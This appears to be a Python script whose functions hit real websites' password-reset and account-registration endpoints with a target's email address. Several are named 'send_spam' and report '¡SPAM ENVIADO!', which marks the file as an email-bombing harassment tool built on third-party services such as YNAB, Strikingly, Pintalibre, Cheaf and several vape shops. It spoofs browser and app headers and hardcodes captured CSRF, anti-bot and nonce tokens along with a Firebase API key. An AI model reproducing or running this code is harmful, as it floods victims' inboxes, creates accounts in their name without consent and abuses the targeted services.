def outdooractivev2_recuperar_contrasena(user):
    # Definir la URL y los encabezados para la solicitud
    url_outdooractive = "https://www.outdooractive.com/es/community.send.pw.ctrl"
    headers_outdooractive = {
        "authority": "www.outdooractive.com",
        "method": "POST",
        "path": "/es/community.send.pw.ctrl",
        "scheme": "https",
        "accept": "application/json",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "es-ES,es;q=0.9,ru;q=0.8",
        "content-length": "61",  # Este valor puede cambiar dependiendo del tamaño del payload
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://www.outdooractive.com",
        "referer": "https://www.outdooractive.com/es/community/lostpassword.html",
        "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
    }

    # Crear el payload para la solicitud de recuperación de contraseña
    payload_outdooractive = {
        "l": "310",  # Este valor es estático, dependiendo de la API de Outdooractive
        "email": user,  # Email proporcionado por el usuario
        "proj": "outdooractive",
        "async": "true"
    }

    try:
        # Realizar la solicitud POST para recuperar la contraseña
        response_outdooractive = requests.post(url_outdooractive, data=payload_outdooractive, headers=headers_outdooractive)
        response_outdooractive.raise_for_status()  # Lanza un error si la respuesta no es 2xx
        
        return f"¡Solicitud de recuperación de contraseña enviada a {user} en Outdooractive!"
    except requests.exceptions.RequestException as e:
        return f"Error al intentar enviar la solicitud de recuperación de contraseña a {user} en Outdooractive: {str(e)}"

def strikinglyv2_recuperar_contrasena(user):
    # Definir la URL y los encabezados para la solicitud
    url_strikingly = "https://es.strikingly.com/s/users/password"
    headers_strikingly = {
        "origin": "https://es.strikingly.com",
        "priority": "u=0, i",
        "referer": "https://es.strikingly.com/s/users/password/new",
        "sec-ch-ua": "\"Google Chrome\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
    }

    # Crear el payload para la solicitud de recuperación de contraseña
    payload_strikingly = {
        "utf8": "✓",
        "authenticity_token": "authenticity_token",  # Token de autenticidad que debe ser obtenido previamente
        "user[email]": user,  # Email proporcionado por el usuario
        "commit": "Envíame+instrucciones+para+restablecer+la+contraseña"
    }

    try:
        # Realizar la solicitud POST para recuperar la contraseña
        response_strikingly = requests.post(url_strikingly, data=payload_strikingly, headers=headers_strikingly)
        response_strikingly.raise_for_status()  # Lanza un error si la respuesta no es 2xx
        
        return f"¡Solicitud de recuperación de contraseña enviada a {user} en Strikingly!"
    except requests.exceptions.RequestException as e:
        return f"Error al intentar enviar la solicitud de recuperación de contraseña a {user} en Strikingly: {str(e)}"

def hebv2_recuperar_cuenta(user):
    # Definir la URL y los encabezados para la solicitud
    url_heb = "https://heb-cms-prod.eastus.cloudapp.azure.com/auth/send-new-user-account-code"
    headers_heb = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*"
    }

    # Crear el payload para la solicitud de recuperación de cuenta
    payload_heb = {
        "email": user  # El correo electrónico proporcionado por el usuario
    }

    try:
        # Realizar la solicitud POST para recuperar la cuenta
        response_heb = requests.post(url_heb, json=payload_heb, headers=headers_heb)
        response_heb.raise_for_status()  # Lanza un error si la respuesta no es 2xx
        
        return f"¡Solicitud de recuperación de cuenta enviada a {user} en HHEEBB!"
    except requests.exceptions.RequestException as e:
        return f"Error al intentar enviar la solicitud de recuperación de cuenta a {user} en HHEEBB: {str(e)}"

def macstorev2_recuperar_cuenta(user):
    # Definir la URL y los encabezados para la solicitud
    url_macstore = "https://www.macstoreonline.com.mx/login/RecuperaPass"
    headers_macstore = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*"
    }

    # Crear el payload para la solicitud de recuperación de cuenta
    payload_macstore = {
        "recuperapass": user  # El correo electrónico proporcionado por el usuario
    }

    try:
        # Realizar la solicitud POST para recuperar la cuenta
        response_macstore = requests.post(url_macstore, json=payload_macstore, headers=headers_macstore)
        response_macstore.raise_for_status()  # Lanza un error si la respuesta no es 2xx
        
        return f"¡Solicitud de recuperación de cuenta enviada a {user} en Macstore!"
    except requests.exceptions.RequestException as e:
        return f"Error al intentar enviar la solicitud de recuperación de cuenta a {user} en Macstore: {str(e)}"



def puntoofertav2_recuperarcontraseña(user):
    # Definir la URL y los encabezados para la solicitud
    url_puntoofertav2 = "https://api.puntoferta.com.mx/API/V1.0/clients/forgot"
    headers_puntoofertav2 = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*"
    }

    # Crear el payload para la solicitud de recuperación de contraseña
    payload_puntoofertav2 = {
        "email": user  # El correo electrónico proporcionado por el usuario
    }

    try:
        # Realizar la solicitud POST para recuperar la cuenta
        response_puntoofertav2 = requests.post(url_puntoofertav2, json=payload_puntoofertav2, headers=headers_puntoofertav2)
        response_puntoofertav2.raise_for_status()  # Lanza un error si la respuesta no es 2xx
        
        return f"¡Solicitud de recuperación de contraseña enviada a {user} en puntoofertav2!"
    except requests.exceptions.RequestException as e:
        return f"Error al intentar enviar la solicitud de recuperación de contraseña a {user} en puntoofertav2: {str(e)}"


def ynabv2_recuperarcontraseña(user):
    # Definir la URL y los encabezados para la solicitud
    url_ynab = "https://app.ynab.com/api/v1/catalog?operation_name=initiatePasswordReset"
    headers_ynab = {
        "origin": "https://app.ynab.com",
        "priority": "u=1, i",
        "referer": "https://app.ynab.com/users/password/new",
        "sec-ch-ua": "\"Google Chrome\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "x-castle-request-token": "wsuVkLGks7CJt6q4hImssvessoqTofuqlrqFuIfzgfq4lYvB-OO7sUWlgGVjONnkRmbWj2_nkJfForG-iYOsqY3t35DN27KVrwysvoiKfJCQvaSDgs-0vceK0eJBL_u4-huutdeErMLvicPw5_LF0eTpg4imuIyV3-HC2ef_353G3IyMuKachqjfxdO-vJed8L6YlKjJ3M3k7fvY6sPFyae9n4qmu5qdoMPk6cXEgJ3k4cfYqM_J3uPnhZ3L4N7S5e2DjLu5go2muIKNqNvN2-n6xZK9u5uTu77Atevuzd_pvpTY_4uvNogcpIXq7pWIur2UIdTJ4vrEzYyVycXokajJ4fmo2s3Z7efCldzFhZ3a0Izr7e_Nnbm5jPr66dzV4evfnaC41I24uJyMvcyUlKjMxc_t69iOzLmdnf7784jXuIzN-9eZ4rikjPm7zJ2MoSy0jrmnnY-nuZWLsaSMi7K4nIe4uIzNpuWCEoCIGZxNOEN2iFutYAv2S71ji1vj0m5F8HcqxjGLiaCuyeXJz-HrzZLF7dTU6-fz_uH81amZ7d-QzduA2Puk3sik7d-QxdCZvd-MptjY56W9iAehuqoZA72IiKwJje3fkMXQE7-Kyqw8iD-sDohSEgkAMawcBIisvYiIrAfvMsrn0shvvYiIrP3IyOz9yPzzydHkyRYj6Mz2z1EkzQWKqL2NiKytiHfg",
        "x-csrf-token": "yUbbnwyolSXuu5NXLwA706442WN4RsfZ6BAU_PdHAfc_iW_iHg8doKwTxlAhJocRBvmVIq027JH1rPXeAmhkBA",
        "x-requested-with": "XMLHttpRequest"
    }

    # Crear el payload para la solicitud de recuperación de contraseña
    payload_ynab = {
        "request_data[email]": user,
        "button": ""
    }

    try:
        # Realizar la solicitud POST para iniciar el restablecimiento de contraseña
        response_ynab = requests.post(url_ynab, data=payload_ynab, headers=headers_ynab)
        response_ynab.raise_for_status()  # Lanza un error si la respuesta no es 2xx
        
        return f"¡Solicitud de recuperación de contraseña enviada a {user} en YNAB!"
    except requests.exceptions.RequestException as e:
        return f"Error al intentar enviar la solicitud de recuperación de contraseña a {user} en YNAB: {str(e)}"


def send_spam_pintalibre(email):
    # Crear el payload con la información para el registro en Pintalibre
    payload = {
        "user": {
            "first_name": "Juan",
            "last_name": "Pers",
            "email": email,
            "password": "Gearsofwar3",
            "password_confirmation": "Gearsofwar3",
            "country_id": "11",
            "profile": {
                "phone": {
                    "phone_dial": "52",
                    "phone_number": "2481865169"
                }
            }
        }
    }

    headers_pintalibre = {
        "Host": "api.pintalibreapp.com",
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "Sec-Fetch-Site": "cross-site",
        "Accept-Language": "es-MX,es-419;q=0.9,es;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "Sec-Fetch-Mode": "cors",
        "Origin": "capacitor://localhost",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "X-Device-Id": "A80CBF70-47B5-4E54-8F2A-D88284725465",
        "X-App-Version": "4.0.4"
    }

    url_pintalibre = "https://api.pintalibreapp.com/api/v1/auth/registrations"

    # Realizar la solicitud POST
    response_pintalibre = requests.post(url_pintalibre, json=payload, headers=headers_pintalibre)

    if response_pintalibre.status_code == 200:
        return f"¡SPAM ENVIADO a {email} en Pintalibre!"
    else:
        return f"Hubo un error al intentar enviar el spam a {email} en Pintalibre. Intenta nuevamente."


def send_spam_cheaf(email):
    # Crear el payload con la información para el registro en Cheaf
    payload = {
        "email": email,
        "clientType": "CLIENT_TYPE_IOS",
        "password": "Gearsofwar3@",
        "returnSecureToken": True
    }

    headers_cheaf = {
        "Host": "www.googleapis.com",
        "X-Client-Version": "iOS/FirebaseSDK/10.29.0/FirebaseCore-iOS",
        "Content-Type": "application/json",
        "Accept": "*/*",
        "X-Ios-Bundle-Identifier": "com.cheaf.app",
        "X-Firebase-Gmpid": "1:440998919015:ios:8541f13adde790ee6b8dc2",
        "User-Agent": "FirebaseAuth.iOS/10.29.0 com.cheaf.app/2.7.537 iPhone/18.1.1 hw/iPhone16_2",
        "Accept-Language": "en",
        "Accept-Encoding": "gzip, deflate, br"
    }

    url_cheaf = "https://www.googleapis.com/identitytoolkit/v3/relyingparty/signupNewUser?key=AIzaSyDvv4wgefPrCvwThRS8x3I97wiAto4P-EI"

    # Realizar la solicitud POST
    response_cheaf = requests.post(url_cheaf, json=payload, headers=headers_cheaf)

    if response_cheaf.status_code == 200:
        return f"¡SPAM ENVIADO a {email} en Cheaf!"
    else:
        return f"Hubo un error al intentar enviar el spam a {email} en Cheaf. Intenta nuevamente."

def send_spam_lavaperia(email):
    # Crear el payload con la información para el registro en La Vapería
    payload = (
        f"email={email}&mailchimp_woocommerce_newsletter=1&yith_birthday=11-11-2000&"
        "wc_order_attribution_source_type=organic&wc_order_attribution_referrer=https%3A%2F%2Fwww.google.com%2F&"
        "wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=google&wc_order_attribution_utm_medium=organic&"
        "wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&"
        "wc_order_attribution_session_entry=https%3A%2F%2Flavaperia.com%2F&wc_order_attribution_session_start_time=2024-12-31+01%3A15%3A25&"
        "wc_order_attribution_session_pages=2&wc_order_attribution_session_count=1&"
        "woocommerce-register-nonce=01378021df&_wp_http_referer=%2Fmy-account%2F&register=Registrarse"
    )

    headers_lavaperia = {
        "Host": "lavaperia.com",
        "Content-Length": str(len(payload)),
        "Cache-Control": "max-age=0",
        "Sec-Ch-Ua": "\"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": "\"Windows\"",
        "Accept-Language": "es-419,es;q=0.9",
        "Origin": "https://lavaperia.com",
        "Content-Type": "application/x-www-form-urlencoded",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Referer": "https://lavaperia.com/my-account/",
        "Accept-Encoding": "gzip, deflate, br"
    }

    url_lavaperia = "https://lavaperia.com/my-account/"

    # Realizar la solicitud POST
    response_lavaperia = requests.post(url_lavaperia, data=payload, headers=headers_lavaperia)

    if response_lavaperia.status_code == 200:
        return f"¡SPAM ENVIADO a {email} en La Vapería!"
    else:
        return f"Hubo un error al intentar enviar el spam a {email} en La Vapería. Intenta nuevamente."

def send_spam_vapelab(email):
    # Crear el payload con la información para el registro en Vapelab
    payload = (
        f"email={email}&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=https%3A%2F%2Fvapelab.mx%2F&"
        "wc_order_attribution_session_entry=https%3A%2F%2Fvapelab.mx%2Fmy-account&wc_order_attribution_session_start_time=2024-12-31+01%3A28%3A54&"
        "wc_order_attribution_session_pages=1&wc_order_attribution_session_count=1&"
        "woocommerce-register-nonce=cd178e4b1d&_wp_http_referer=%2Fmy-account&register=Registrarse"
    )

    headers_vapelab = {
        "Host": "vapelab.mx",
        "Content-Length": str(len(payload)),
        "Cache-Control": "max-age=0",
        "Sec-Ch-Ua": "\"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": "\"Windows\"",
        "Accept-Language": "es-419,es;q=0.9",
        "Origin": "https://vapelab.mx",
        "Content-Type": "application/x-www-form-urlencoded",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Referer": "https://vapelab.mx/my-account",
        "Accept-Encoding": "gzip, deflate, br"
    }

    url_vapelab = "https://vapelab.mx/my-account"

    # Realizar la solicitud POST
    response_vapelab = requests.post(url_vapelab, data=payload, headers=headers_vapelab)

    if response_vapelab.status_code == 200:
        return f"¡SPAM ENVIADO a {email} en Vapelab!"
    else:
        return f"Hubo un error al intentar enviar el spam a {email} en Vapelab. Intenta nuevamente."

def send_spam_ivapeo(email):
    # Crear el payload con la información para el registro en IVapeo
    payload = {
        "id_customer": "",
        "id_gender": "1",
        "firstname": "JUAN",
        "lastname": "PEREZ",
        "email": email,
        "password": "Gearsofwar3@",
        "birthday": "11/11/2000",
        "newsletter": "1",
        "psgdpr": "1",
        "submitCreate": "1"
    }

    headers_ivapeo = {
        "Host": "www.ivapeo.com",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "*/*",
        "Accept-Language": "es-419,es;q=0.9",
        "Origin": "https://www.ivapeo.com",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36",
        "Accept-Encoding": "gzip, deflate, br",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Referer": "https://www.ivapeo.com/es/iniciar-sesion?create_account=1"
    }

    url_ivapeo = "https://www.ivapeo.com/es/iniciar-sesion?create_account=1"

    # Realizar la solicitud POST
    response_ivapeo = requests.post(url_ivapeo, data=payload, headers=headers_ivapeo)

    if response_ivapeo.status_code == 200:
        return f"¡SPAM ENVIADO a {email} en IVapeo!"
    else:
        return f"Hubo un error al intentar enviar el spam a {email} en IVapeo. Intenta nuevamente."

def send_spam_cigis(email):
    # Crear el payload con la información para el registro en Cigis
    payload = {
        "email": email,
        "wc_order_attribution_source_type": "organic",
        "wc_order_attribution_referrer": "https://www.google.com/",
        "wc_order_attribution_utm_campaign": "(none)",
        "wc_order_attribution_utm_source": "google",
        "wc_order_attribution_utm_medium": "organic",
        "wc_order_attribution_utm_content": "(none)",
        "wc_order_attribution_utm_id": "(none)",
        "wc_order_attribution_utm_term": "(none)",
        "wc_order_attribution_utm_source_platform": "(none)",
        "wc_order_attribution_utm_creative_format": "(none)",
        "wc_order_attribution_utm_marketing_tactic": "(none)",
        "wc_order_attribution_session_entry": "https://cigis.mx/",
        "wc_order_attribution_session_start_time": "2024-12-31 01:58:19",
        "wc_order_attribution_session_pages": "2",
        "wc_order_attribution_session_count": "1",
        "wc_order_attribution_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36",
        "woocommerce-register-nonce": "55e22e7ef1",
        "_wp_http_referer": "/my-account/",
        "register": "Registrarse"
    }

    headers_cigis = {
        "Host": "cigis.mx",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Language": "es-419,es;q=0.9",
        "Origin": "https://cigis.mx",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36",
        "Accept-Encoding": "gzip, deflate, br",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Referer": "https://cigis.mx/my-account/"
    }

    url_cigis = "https://cigis.mx/my-account/"

    # Realizar la solicitud POST
    response_cigis = requests.post(url_cigis, data=payload, headers=headers_cigis)

    if response_cigis.status_code == 200:
        return f"¡SPAM ENVIADO a {email} en Cigis!"
    else:
        return f"Hubo un error al intentar enviar el spam a {email} en Cigis. Intenta nuevamente."


def send_spam_tryp(email):
    # Crear el payload con la información para el registro en Tryp
    payload = {
        "form_type": "create_customer",
        "utf8": "✓",
        "customer[email]": email,
        "customer[password]": "Gearsofwar3@"
    }

    headers_tryp = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*"
    }

    url_tryp = "https://tryp.shop/account"

    # Realizar la solicitud POST
    response_tryp = requests.post(url_tryp, data=payload, headers=headers_tryp)

    if response_tryp.status_code == 200:
        return f"¡SPAM ENVIADO a {email} en Tryp!"
    else:
        return f"Hubo un error al intentar enviar el spam a {email} en Tryp. Intenta nuevamente."

def recover_password_ivapeo(email):
    # Crear el payload con la información para recuperar la contraseña en IVapeo
    payload = {
        "email": email,
        "submit": ""
    }

    headers_ivapeo = {
        "Host": "www.ivapeo.com",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "*/*",
        "Accept-Language": "es-419,es;q=0.9",
        "Origin": "https://www.ivapeo.com",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36",
        "Accept-Encoding": "gzip, deflate, br",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Referer": "https://www.ivapeo.com/es/iniciar-sesion?create_account=1"
    }

    url_ivapeo = "https://www.ivapeo.com/es/recuperar-contrasena"

    # Realizar la solicitud POST
    response_ivapeo = requests.post(url_ivapeo, data=payload, headers=headers_ivapeo)

    if response_ivapeo.status_code == 200:
        return f"¡Recuperación de contraseña enviada a {email} en IVapeo!"
    else:
        return f"Hubo un error al intentar recuperar la contraseña para {email} en IVapeo. Intenta nuevamente."

def recover_password_lavaperia(email):
    # Crear el payload con la información para recuperar la contraseña en La Vaperia
    payload = {
        "user_login": email,
        "wc_reset_password": "true",
        "woocommerce-lost-password-nonce": "55c88bb1b1",
        "_wp_http_referer": "/my-account/lost-password/"
    }

    headers_lavaperia = {
        "Host": "lavaperia.com",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "*/*",
        "Accept-Language": "es-419,es;q=0.9",
        "Origin": "https://lavaperia.com",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36",
        "Accept-Encoding": "gzip, deflate, br",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Referer": "https://lavaperia.com/my-account/"
    }

    url_lavaperia = "https://lavaperia.com/my-account/lost-password/"

    # Realizar la solicitud POST
    response_lavaperia = requests.post(url_lavaperia, data=payload, headers=headers_lavaperia)

    if response_lavaperia.status_code == 200:
        return f"¡Recuperación de contraseña enviada a {email} en La Vaperia!"
    else:
        return f"Hubo un error al intentar recuperar la contraseña para {email} en La Vaperia. Intenta nuevamente."


def recover_password_tryp(email):
    # Crear el payload con la información para recuperar la contraseña en Tryp
    payload = {
        "form_type": "recover_customer_password",
        "utf8": "✓",
        "email": email
    }

    headers_tryp = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*"
    }

    url_tryp = "https://tryp.shop/account/recover"

    # Realizar la solicitud POST
    response_tryp = requests.post(url_tryp, data=payload, headers=headers_tryp)

    if response_tryp.status_code == 200:
        return f"¡Recuperación de contraseña enviada a {email} en Tryp!"
    else:
        return f"Hubo un error al intentar recuperar la contraseña para {email} en Tryp. Intenta nuevamente."

def recover_password_vapelab(email):
    # Crear el payload con la información para recuperar la contraseña en Vapelab
    payload = {
        "user_login": email,
        "wc_reset_password": "true",
        "woocommerce-lost-password-nonce": "82ebfd860f",
        "_wp_http_referer": "/my-account/lost-password"
    }

    headers_vapelab = {
        "Host": "vapelab.mx",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "*/*",
        "Accept-Language": "es-419,es;q=0.9",
        "Origin": "https://vapelab.mx",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36",
        "Accept-Encoding": "gzip, deflate, br",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Referer": "https://vapelab.mx/my-account"
    }

    url_vapelab = "https://vapelab.mx/my-account/lost-password"

    # Realizar la solicitud POST
    response_vapelab = requests.post(url_vapelab, data=payload, headers=headers_vapelab)

    if response_vapelab.status_code == 200:
        return f"¡Recuperación de contraseña enviada a {email} en Vapelab!"
    else:
        return f"Hubo un error al intentar recuperar la contraseña para {email} en Vapelab. Intenta nuevamente."

def recover_password_pintalibre(email):
    # Crear el payload con la información para recuperar la contraseña en Pintalibre
    payload = {
        "user": {
            "email": email
        }
    }

    headers_pintalibre = {
        "Host": "api.pintalibreapp.com",
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "Sec-Fetch-Site": "cross-site",
        "Accept-Language": "es-MX,es-419;q=0.9,es;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "Sec-Fetch-Mode": "cors",
        "Origin": "capacitor://localhost",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "X-Device-Id": "A80CBF70-47B5-4E54-8F2A-D88284725465",
        "X-App-Version": "4.0.4",
        "Content-Length": "34",
        "Sec-Fetch-Dest": "empty"
    }

    url_pintalibre = "https://api.pintalibreapp.com/api/v1/auth/passwords"

    # Realizar la solicitud POST
    response_pintalibre = requests.post(url_pintalibre, json=payload, headers=headers_pintalibre)

    if response_pintalibre.status_code == 200:
        return f"¡Recuperación de contraseña enviada a {email} en Pintalibre!"
    else:
        return f"Hubo un error al intentar recuperar la contraseña para {email} en Pintalibre. Intenta nuevamente."

def recover_password_cigis(email):
    # Crear el payload con la información para recuperar la contraseña en Cigis
    payload = {
        "user_login": email,
        "wc_reset_password": "true",
        "woocommerce-lost-password-nonce": "756e169026",
        "_wp_http_referer": "/my-account/lost-password/"
    }

    headers_cigis = {
        "Host": "cigis.mx",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "*/*",
        "Accept-Language": "es-419,es;q=0.9",
        "Origin": "https://cigis.mx",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36",
        "Accept-Encoding": "gzip, deflate, br",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Referer": "https://cigis.mx/my-account/"
    }

    url_cigis = "https://cigis.mx/my-account/lost-password/"

    # Realizar la solicitud POST
    response_cigis = requests.post(url_cigis, data=payload, headers=headers_cigis)

    if response_cigis.status_code == 200:
        return f"¡Recuperación de contraseña enviada a {email} en Cigis!"
    else:
        return f"Hubo un error al intentar recuperar la contraseña para {email} en Cigis. Intenta nuevamente."

def restablecer_contraseña_cheaf(email):
    url = "https://www.googleapis.com/identitytoolkit/v3/relyingparty/getOobConfirmationCode?key=AIzaSyDvv4wgefPrCvwThRS8x3I97wiAto4P-EI"
    
    # Crear el payload con la información para restablecer la contraseña
    payload = {
        "email": email,
        "requestType": "PASSWORD_RESET",
        "clientType": "CLIENT_TYPE_IOS"
    }

    headers = {
        "Host": "www.googleapis.com",
        "X-Client-Version": "iOS/FirebaseSDK/10.29.0/FirebaseCore-iOS",
        "Content-Type": "application/json",
        "Accept": "*/*",
        "X-Ios-Bundle-Identifier": "com.cheaf.app",
        "Content-Length": "90",
        "X-Firebase-Gmpid": "1:440998919015:ios:8541f13adde790ee6b8dc2",
        "User-Agent": "FirebaseAuth.iOS/10.29.0 com.cheaf.app/2.7.537 iPhone/18.1.1 hw/iPhone16_2",
        "Accept-Language": "en",
        "Accept-Encoding": "gzip, deflate, br"
    }

    # Realizar la solicitud POST
    response = requests.post(url, data=json.dumps(payload), headers=headers)

    if response.status_code == 200:
        return f"Recuperación de contraseña solicitada con éxito para {email} en Cheaf."
    else:
        return f"Hubo un error al intentar recuperar la contraseña para {email} en Cheaf. Código de error: {response.status_code}"
